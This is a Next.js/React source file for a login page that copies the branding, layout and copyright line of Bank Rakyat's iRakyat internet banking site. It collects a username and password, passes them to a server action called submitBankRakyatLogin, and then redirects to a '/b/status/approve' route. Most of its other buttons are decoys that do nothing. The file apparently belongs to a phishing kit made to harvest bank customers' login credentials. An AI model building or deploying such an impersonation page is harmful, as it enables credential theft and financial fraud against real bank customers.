"use client";

import React, { useState } from "react";
import Image from "next/image";
import { User, Lock, Loader2 } from "lucide-react";
import { submitBankRakyatLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function BankRakyatLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Sila masukkan maklumat login yang sah.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitBankRakyatLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login gagal. Sila cuba lagi.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Sesuatu yang tidak kena berlaku. Sila cuba sebentar lagi.");
      setIsLoading(false);
    }
  };

  const handleClear = () => {
    setUsername("");
    setPassword("");
    setError("");
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#E0E0E0] font-sans text-[#333]">
      {/* Header */}
      <header className="flex h-20 items-center justify-between bg-white px-6 shadow-sm">
        <div className="flex items-center">
            <span className="text-3xl font-black italic tracking-tighter text-[#1A237E]">i</span>
            <span className="text-2xl font-bold tracking-tight text-[#0D47A1]">RAKYAT</span>
        </div>
        <div className="flex flex-col items-end">
            <div className="bg-[#0D47A1] px-2 py-0.5 text-[15px] font-bold text-white">
                BANK RAKYAT
            </div>
            <span className="text-[10px] font-medium text-gray-500">Your Bank of Choice</span>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center px-4 py-12">
        <div className="w-full max-w-lg bg-white p-10 shadow-lg ring-1 ring-gray-200">
          <div className="mb-8 text-center">
            <h2 className="text-[28px] font-medium leading-tight">
              Welcome to <span className="font-bold text-[#E67E22]">iRakyat</span> Internet Banking
            </h2>
            <p className="mt-2 text-[14px] text-gray-600">
              Manage your account online at your convenience
            </p>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">
            {error && (
              <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                {error}
              </div>
            )}

            <div className="space-y-6">
              {/* Username */}
              <div className="space-y-2">
                <label className="text-[15px] font-bold text-gray-400">Username:</label>
                <div className="relative group">
                  <div className="absolute left-3 top-1/2 -translate-y-1/2 text-[#E67E22]">
                    <User size={20} fill="currentColor" fillOpacity={0.8} />
                  </div>
                  <input
                    type="text"
                    placeholder="Masukkan Username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full border border-gray-300 py-3 pl-11 pr-4 text-[16px] outline-none transition-all focus:border-[#E67E22]"
                    required
                  />
                </div>
              </div>

              {/* Password */}
              <div className="space-y-2">
                <label className="text-[15px] font-bold text-gray-400">Password:</label>
                <div className="relative group">
                  <div className="absolute left-3 top-1/2 -translate-y-1/2 text-[#E67E22]">
                    <Lock size={20} fill="currentColor" fillOpacity={0.8} />
                  </div>
                  <input
                    type="password"
                    placeholder="Masukkan Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full border border-gray-300 py-3 pl-11 pr-4 text-[16px] outline-none transition-all focus:border-[#E67E22]"
                    required
                  />
                </div>
              </div>
            </div>

            {/* Buttons Row 1 */}
            <div className="flex gap-4 pt-2">
              <button
                type="button"
                onClick={handleClear}
                className="flex-1 bg-[#E67E22] py-2.5 text-lg font-bold text-white transition-all active:scale-[0.98]"
              >
                Clear
              </button>
              <button
                type="submit"
                disabled={isLoading}
                className="flex-1 bg-[#E67E22] py-2.5 text-lg font-bold text-white transition-all active:scale-[0.98] disabled:opacity-80"
              >
                {isLoading ? (
                  <Loader2 className="mx-auto h-6 w-6 animate-spin" />
                ) : (
                  "Login"
                )}
              </button>
            </div>

            {/* Blue Buttons Row */}
            <div className="space-y-3 pt-2">
              <button
                type="button"
                className="w-full bg-[#0D47A1] py-3 text-[17px] font-bold text-white transition-all active:scale-[0.98]"
              >
                Register
              </button>
              <button
                type="button"
                className="w-full bg-[#0D47A1] py-3 text-[17px] font-bold text-white transition-all active:scale-[0.98]"
              >
                1PAY Payee Enquiry
              </button>
            </div>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="px-6 py-10 text-center">
        <div className="mb-4 flex flex-wrap justify-center gap-x-3 gap-y-2 text-[13px] font-medium text-[#0D47A1]">
          <button className="hover:underline">Disclaimer</button>
          <span className="text-gray-300">|</span>
          <button className="hover:underline">Client Charter</button>
          <span className="text-gray-300">|</span>
          <button className="hover:underline">Privacy Policy</button>
          <span className="text-gray-300">|</span>
          <button className="hover:underline">Terms & Conditions</button>
        </div>
        <div className="mb-6 flex flex-wrap justify-center gap-x-3 gap-y-2 text-[13px] font-medium text-[#0D47A1]">
            <button className="hover:underline">Personal Data Protection Act</button>
            <span className="text-gray-300">|</span>
            <button className="hover:underline">FAQ</button>
        </div>
        
        <p className="text-[12px] text-gray-500">
          Copyright 2026 © Bank Rakyat. All rights reserved.<br />
          Best viewed with the latest versions of Google Chrome, Mozilla Firefox,<br />
          Microsoft Edge and Safari.
        </p>
      </footer>
    </div>
  );
}
